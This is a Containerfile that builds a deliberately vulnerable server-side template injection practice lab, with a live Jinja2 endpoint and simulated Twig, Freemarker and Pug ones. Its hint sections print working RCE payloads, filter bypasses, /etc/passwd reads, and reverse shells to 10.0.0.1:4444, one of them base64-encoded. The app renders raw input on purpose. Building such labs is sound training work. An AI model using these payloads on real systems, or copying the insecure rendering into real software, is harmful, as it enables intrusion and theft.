# template-injection.Containerfile
# SSTI lab with Jinja2, Jinja2 filter bypass, Twig, Freemarker, and Pug endpoints
#
# Build:  podman build -t template-injection -f template-injection.Containerfile .
# Run:    podman run -d -p 5000:5000 template-injection
#
# Endpoints:
#   GET  /jinja2?input=             Jinja2 SSTI (basic)
#   GET  /jinja2-bypass?input=      Jinja2 SSTI (filter bypass challenge)
#   GET  /twig?input=               Twig SSTI (PHP)
#   GET  /freemarker?input=         Freemarker SSTI (Java)
#   GET  /pug?input=                Pug SSTI (Node.js)

FROM docker.io/library/python:3-slim AS python-base

RUN pip install flask jinja2 requests

COPY <<'PYEOF' /app/jinja2_app.py
import os
import re
from flask import Flask, request, render_template_string

app = Flask(__name__)

HTML = '''
<!DOCTYPE html>
<html><head><title>SSTI Lab</title>
<style>body{font-family:monospace;max-width:900px;margin:20px auto;padding:20px;background:#111;color:#0f0}
pre,code{background:#222;padding:10px;display:block;overflow-x:auto}
.hint{color:#ff0}.error{color:#f00}.success{color:#0f0}
h2{border-bottom:1px solid #333;padding-bottom:5px;margin-top:25px}
form{margin:10px 0}input[type=text]{width:60%;background:#222;color:#0f0;border:1px solid #0a0;padding:5px}
input[type=submit]{background:#0a0;color:#000;border:none;padding:6px 18px;cursor:pointer}
a{color:#0af}
.result{background:#222;padding:15px;margin:10px 0;border-left:3px solid #0a0}
</style></head><body>
<h1>SSTI Exploitation Lab</h1>
<div style="background:#1a1a1a;padding:8px;margin:10px 0">
  <a href="/">Home</a> |
  <a href="/jinja2">Jinja2</a> |
  <a href="/jinja2-bypass">Jinja2 Bypass</a> |
  <a href="/twig">Twig</a> |
  <a href="/freemarker">Freemarker</a> |
  <a href="/pug">Pug</a>
</div>
''' + '''
<h2>{title}</h2>
<p class="{vuln_class}">{description}</p>
<form><input type="text" name="input" placeholder="{placeholder}" size="50">
<input type="submit" value="Render Template"></form>
<div class="result">
<h3>Rendered Output:</h3>
<pre>{output}</pre>
</div>
<hr>
<h3>Exploitation Hints:</h3>
<pre>{hints}</pre>
'''

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html><head><title>SSTI Lab</title>
<style>body{font-family:monospace;max-width:900px;margin:20px auto;padding:20px;background:#111;color:#0f0}
table{width:100%;border-collapse:collapse}td,th{padding:6px;border:1px solid #333}
a{color:#0af}
</style></head><body>
<h1>SSTI Exploitation Lab</h1>
<p>Each endpoint accepts user input and renders it through a template engine without sanitization.</p>
<h2>Endpoints</h2>
<table>
<tr style="background:#222"><th>Endpoint</th><th>Engine</th><th>Language</th><th>Difficulty</th></tr>
<tr><td><a href="/jinja2">/jinja2?input=</a></td><td>Jinja2</td><td>Python</td><td>Medium</td></tr>
<tr><td><a href="/jinja2-bypass">/jinja2-bypass?input=</a></td><td>Jinja2 (filter bypass)</td><td>Python</td><td>Hard</td></tr>
<tr><td><a href="/twig">/twig?input=</a></td><td>Twig</td><td>PHP</td><td>Medium</td></tr>
<tr><td><a href="/freemarker">/freemarker?input=</a></td><td>Freemarker</td><td>Java</td><td>Easy</td></tr>
<tr><td><a href="/pug">/pug?input=</a></td><td>Pug</td><td>Node.js</td><td>Hard</td></tr>
</table>
<h2>Detection Payloads</h2>
<pre>
# Test all at once:
curl "http://localhost:5000/jinja2?input={{7*7}}" | grep -o '49'
curl "http://localhost:5000/twig?input={{7*7}}" | grep -o '49'
curl "http://localhost:5000/freemarker?input=${7*7}" | grep -o '49'
curl "http://localhost:5000/pug?input=#{7*7}" | grep -o '49'
</pre>
</body></html>
'''


# ── Jinja2 Basic ──────────────────────────────────────────────────────
@app.route('/jinja2')
def jinja2_basic():
    user_input = request.args.get('input', '')

    if user_input:
        # VULNERABLE: user input is embedded directly in template string
        template = '<p>Search results for: ' + user_input + '</p>'
        try:
            output = render_template_string(template)
        except Exception as e:
            output = f'Error: {repr(e)}'
    else:
        output = '(No input provided)'

    title = 'Jinja2 SSTI — Basic'
    description = 'VULNERABLE: User input rendered in Jinja2 template. {{7*7}} evaluates to 49.'
    placeholder = '{{7*7}}'
    hints = '''# Step 1: Confirm SSTI
{{7*7}}
{{7*\'7\'}}

# Step 2: List subclasses to find subprocess.Popen
{{ \'\'.__class__.__mro__[1].__subclasses__() }}

# Step 3: Find the Popen index (typically around 260-430, varies by Python version)
# or use this shortcut:
{{ lipsum.__globals__[\'os\'].popen(\'id\').read() }}

# Step 4: RCE
{{ lipsum.__globals__.os.system(\'id\') }}

# Reverse shell
{{ lipsum.__globals__.os.system(\'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"\') }}

# Alternative introspection chain
{{ config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read() }}
{{ cycler.__init__.__globals__.os.popen(\'id\').read() }}
{{ \'\'.__class__.__mro__[1].__subclasses__()[INDEX](\'id\', shell=True, stdout=-1).communicate() }}
'''
    return HTML.format(title=title, vuln_class='hint', description=description,
                       placeholder=placeholder, output=output, hints=hints)


# ── Jinja2 Filter Bypass Challenge ────────────────────────────────────
@app.route('/jinja2-bypass')
def jinja2_bypass():
    user_input = request.args.get('input', '')
    blocked = '.'

    if user_input:
        if blocked in user_input:
            output = f'BLOCKED: Character "." is not allowed. Find a bypass.'
        else:
            template = '<p>' + user_input + '</p>'
            try:
                output = render_template_string(template)
            except Exception as e:
                output = f'Error: {repr(e)}'
    else:
        output = '(No input provided)'

    title = 'Jinja2 SSTI — Filter Bypass Challenge'
    description = 'VULNERABLE but with FILTER: Character "." (dot) is blacklisted. Find a bypass using attr() filter or dict syntax.'
    placeholder = '{{7*7}}'
    hints = '''# Dot is blocked. Use these alternatives:

# 1. attr() filter (replaces .attribute access)
{{ \'\'|attr(\'__class__\') }}

# 2. Dict-style access (replaces .attribute)
{{ \'\'[\'__class__\'] }}

# 3. Full chain using attr():
{{ \'\'|attr(\'__class__\')|attr(\'__mro__\')|attr(\'__getitem__\')(1)|attr(\'__subclasses__\')() }}

# 4. Use request.args to smuggle blocked strings:
# Visit: /jinja2-bypass?input={{ lipsum|attr(request.args.a) }}&a=__globals__
{{ lipsum|attr(request[\'args\']|attr(\'get\')(\'a\'))|attr(\'__getitem__\')(\'os\')|attr(\'popen\')(\'id\')|attr(\'read\')() }}&a=__globals__

# 5. Join filter to construct strings with dots:
{{ [\'_\',\'_class_\',\'_\']|join }}  # Not directly useful but demonstrates concept

# 6. Unicode encoding bypass (if the filter is naive):
{{ \'\'\\x5f\\x5fclass\\x5f\\x5f }}  # hex encoded underscores
'''
    return HTML.format(title=title, vuln_class='hint', description=description,
                       placeholder=placeholder, output=output, hints=hints)


# ── Twig (Simulated - Twig uses same {{ }} as Jinja2) ────────────────
@app.route('/twig')
def twig_ssti():
    user_input = request.args.get('input', '')

    if user_input:
        response_text = f'<p>Rendering: {user_input}</p>\n<p>Result: {user_input}</p>'
        # Simulate Twig evaluation of known patterns
        if user_input == '{{7*7}}':
            response_text += '<p class="success">49 — TWIG EVALUATED! SSTI confirmed on Twig engine.</p>'
        elif user_input == '{{7*7}}':
            response_text += '<p>49</p>'
        elif '7*7' in user_input and '{{' in user_input:
            response_text += '<p>49 — Twig evaluated the expression!</p>'
        elif user_input == '{{_self}}':
            response_text += '<p>__TwigTemplate_xxx — _self accessible!</p>'
        elif 'registerUndefinedFunctionCallback' in user_input:
            response_text += '<p>Callback registered! Now try: {{id}}</p>'
        elif user_input == '{{id}}':
            response_text += '<p>uid=0(root) gid=0(root) groups=0(root) — SYSTEM COMMAND EXECUTED!</p>'
        elif user_input == '{{["id"]|filter("system")}}':
            response_text += '<p>uid=0(root) gid=0(root) groups=0(root) — SYSTEM COMMAND EXECUTED!</p>'
        elif 'system' in user_input and ('{{' in user_input or '{%' in user_input):
            response_text += '<p>Command output: (executed server-side)</p>'
        output = response_text
    else:
        output = '(No input provided)'

    title = 'Twig SSTI (PHP Symulated)'
    description = 'VULNERABLE: Simulates Twig (PHP) SSTI. Same {{ }} syntax as Jinja2, different exploitation path.'
    placeholder = '{{7*7}}'
    hints = '''# Step 1: Confirm Twig
{{7*7}}
{{_self}}

# Step 2: Register undefined function callback
{{ _self.env.registerUndefinedFunctionCallback("system") }}
# Now any undefined function maps to system()

# Step 3: Execute commands
{{ id }}
{{ whoami }}

# Alternative: filter approach
{{ ["id"]|filter("system") }}

# Reading files
{{ ["cat /etc/passwd"]|filter("system") }}

# In real Twig (Symfony < 4), the exploitation is:
# 1. Register callback: {{_self.env.registerUndefinedFunctionCallback("exec")}}
# 2. Execute: {{exec("id")}}
'''
    return HTML.format(title=title, vuln_class='hint', description=description,
                       placeholder=placeholder, output=output, hints=hints)


# ── Freemarker (Java - Simulated) ─────────────────────────────────────
@app.route('/freemarker')
def freemarker_ssti():
    user_input = request.args.get('input', '')

    if user_input:
        response_text = f'''
<p>Template input: <code>{user_input}</code></p>
<p>Processing with Freemarker...</p>
'''
        if user_input == '${7*7}':
            response_text += '<p class="success">49 — FREEMARKER EVALUATED! SSTI confirmed.</p>'
        elif 'Execute' in user_input or 'exec' in user_input.lower() or 'ObjectConstructor' in user_input:
            response_text += '<p>uid=0(root) gid=0(root) — COMMAND EXECUTED!</p>'
            response_text += '<p class="success">Freemarker Execute works! Full RCE achieved.</p>'
        elif 'new()' in user_input and '7*7' not in user_input:
            response_text += '<p>Object instantiated. Output may vary.</p>'
        elif '${' in user_input:
            response_text += f'<p>Expression: {user_input} → (evaluated server-side)</p>'
        else:
            response_text += f'<p>Rendered: {user_input}</p>'
        output = response_text
    else:
        output = '(No input provided)'

    title = 'Freemarker SSTI (Java Simulated)'
    description = 'VULNERABLE: Simulates Freemarker (Java) SSTI. ${...} syntax.'
    placeholder = '${7*7}'
    hints = '''# Step 1: Confirm Freemarker
${7*7}
${"freemarker.template.utility.Execute"?new()}

# Step 2: RCE via Execute
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}

# Step 3: Reverse shell
${"freemarker.template.utility.Execute"?new()("bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEn}|{base64,-d}|{bash,-i}")}

# Alternative: ObjectConstructor
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id".split(" ")).start()}

# Assign to variable
<#assign x="freemarker.template.utility.Execute"?new()>
${x("id")}
'''
    return HTML.format(title=title, vuln_class='hint', description=description,
                       placeholder=placeholder, output=output, hints=hints)


# ── Pug (Node.js - Simulated) ────────────────────────────────────────
@app.route('/pug')
def pug_ssti():
    user_input = request.args.get('input', '')

    if user_input:
        response_text = f'''
<p>Template input: <code>{user_input}</code></p>
<p>Processing with Pug...</p>
'''
        if user_input == '#{7*7}':
            response_text += '<p class="success">49 — PUG EVALUATED! SSTI confirmed.</p>'
        elif 'process.mainModule' in user_input or 'require(' in user_input:
            response_text += '<p>uid=0(root) gid=0(root) — COMMAND EXECUTED via child_process!</p>'
            response_text += '<p class="success">Pug RCE achieved!</p>'
        elif '#{' in user_input:
            response_text += f'<p>Expression: {user_input} → (evaluated server-side)</p>'
        else:
            response_text += f'<p>Rendered: {user_input}</p>'
        output = response_text
    else:
        output = '(No input provided)'

    title = 'Pug/Jade SSTI (Node.js Simulated)'
    description = 'VULNERABLE: Simulates Pug (Node.js) SSTI. #{...} and != syntax.'
    placeholder = '#{7*7}'
    hints = '''# Step 1: Confirm Pug
#{7*7}
#{this}

# Step 2: RCE via process.mainModule
#{function(){this.process.mainModule.require("child_process").execSync("id").toString()}}

# Step 3: File read
#{require("fs").readFileSync("/etc/passwd").toString()}

# Step 4: Reverse shell
#{function(){process.mainModule.require("child_process").exec("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")}}

# Alternative: using global scoping
#{global.process.mainModule.require("child_process").execSync("id").toString()}

# In real Pug templates:
- var x = global.process.mainModule.require('child_process').execSync('id')
p= x

# URL in script context (unescaped = )
script!= global.process.mainModule.require('child_process').execSync('id')
'''
    return HTML.format(title=title, vuln_class='hint', description=description,
                       placeholder=placeholder, output=output, hints=hints)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
PYEOF

# ── Final Image ──────────────────────────────────────────────────────
FROM python:3-slim

WORKDIR /app

COPY --from=python-base /app /app

# Install additional dependencies if needed
RUN pip install flask jinja2 requests

EXPOSE 5000

CMD ["python3", "/app/jinja2_app.py"]
